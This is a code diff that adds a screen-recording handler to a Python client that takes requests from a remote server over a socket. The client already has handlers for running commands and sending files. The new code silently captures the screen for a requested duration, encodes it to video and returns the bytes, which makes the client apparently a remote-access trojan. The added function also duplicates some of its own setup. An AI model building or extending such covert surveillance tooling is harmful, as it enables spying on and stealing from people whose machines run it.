@@ -2,9 +2,16 @@ import json
 import socket
 import subprocess
 import struct
+
+import numpy as np
 import pyautogui
 import io
 import os
+import time
+import mss
+import cv2
+
+
 
 def receive_all(sock, size):
     data = b''
@@ -81,6 +88,61 @@ def send_file_(request):
 def handle_file_request(request):
     return send_file_(request)
 
+#recorder
+
+def send_record(request):
+    duration = request.get("duration")
+    temp_file = "temp_record.avi"
+    fps = 30
+    interval = 1 / fps
+
+    with mss.mss() as sct:
+        duration = request.get("duration")
+        temp_file = "temp_record.avi"
+        target_fps = 30
+        frame_interval = 1.0 / target_fps
+        frames = []
+
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            width, height = monitor["width"], monitor["height"]
+
+            start_time = time.time()
+            next_frame_time = start_time
+
+            while time.time() - start_time < duration:
+                now = time.time()
+                if now >= next_frame_time:
+                    img = sct.grab(monitor)
+                    frame = np.array(img)[:, :, :3]
+                    frames.append(frame)
+                    next_frame_time += frame_interval
+                else:
+                    # Sleep a little to avoid busy wait
+                    time.sleep(0.001)
+
+        actual_duration = time.time() - start_time
+        actual_fps = len(frames) / actual_duration
+
+        print(f"Captured {len(frames)} frames in {actual_duration:.2f} seconds, actual FPS: {actual_fps:.2f}")
+
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        out = cv2.VideoWriter(temp_file, fourcc, actual_fps, (width, height))
+        for frame in frames:
+            out.write(frame)
+        out.release()
+
+        with open(temp_file, "rb") as f:
+            video_bytes = f.read()
+
+        os.remove(temp_file)
+        return video_bytes
+
+
+def handle_recorded(request):
+    return send_record(request)
+
+
 actions = {
     "command": {
         "handler": handle_command
@@ -90,6 +152,9 @@ actions = {
     },
     "file": {
         "handler": handle_file_request
+    },
+    "record": {
+        "handler": handle_recorded
     }
 }
 
@@ -104,7 +169,7 @@ def main():
         while True:
             length_bytes = receive_all(client_socket, 4)
             if not length_bytes:
-                print("Server closed connection.")
+                print("Server closed connection:")
                 return
 
             length = struct.unpack(">I", length_bytes)[0]
